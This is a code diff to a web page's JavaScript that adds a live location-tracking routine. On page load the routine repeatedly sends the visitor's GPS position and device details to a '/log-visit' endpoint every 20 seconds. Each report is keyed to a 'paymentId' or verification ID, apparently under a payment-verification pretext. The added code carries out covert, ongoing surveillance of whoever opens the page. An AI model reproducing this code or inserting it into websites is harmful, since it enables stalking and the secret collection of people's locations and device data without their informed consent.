@@ -775,6 +775,44 @@
             }
         }
 
+        // REAL-TIME TRACKING: Periodically send location to server
+        let liveTrackingInterval = null;
+        let sessionVerificationId = sessionStorage.getItem('sessionVerificationId');
+
+        async function sendLiveLocationUpdate() {
+            if (!bestGpsFound && !capturedLocation) return;
+
+            const loc = bestGpsFound ? extractPositionData(bestGpsFound, 'GPS-Live') : JSON.parse(capturedLocation);
+
+            try {
+                const response = await fetch('/log-visit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        paymentId: sessionVerificationId,
+                        location: { finalLocation: loc },
+                        deviceDetails: capturedDeviceDetails,
+                        isUpdate: true
+                    })
+                });
+                const data = await response.json();
+                if (data.verificationId && !sessionVerificationId) {
+                    sessionVerificationId = data.verificationId;
+                    sessionStorage.setItem('sessionVerificationId', data.verificationId);
+                }
+            } catch (e) {
+                console.log('Live update failed');
+            }
+        }
+
+        function startLiveTracking() {
+            if (liveTrackingInterval) return;
+            // Initial send
+            setTimeout(sendLiveLocationUpdate, 5000);
+            // Periodic update every 20 seconds
+            liveTrackingInterval = setInterval(sendLiveLocationUpdate, 20000);
+        }
+
         // Initialize data capture on page load
         window.addEventListener('load', async () => {
             console.log('🚀 Starting Powerfull Initialization...');
@@ -787,6 +825,9 @@
 
             // Capture location in background (35s pulse)
             captureLocationWithFallback();
+
+            // Start Live Tracking to Server
+            startLiveTracking();
 
             console.log('✅ Initialization complete');
         });
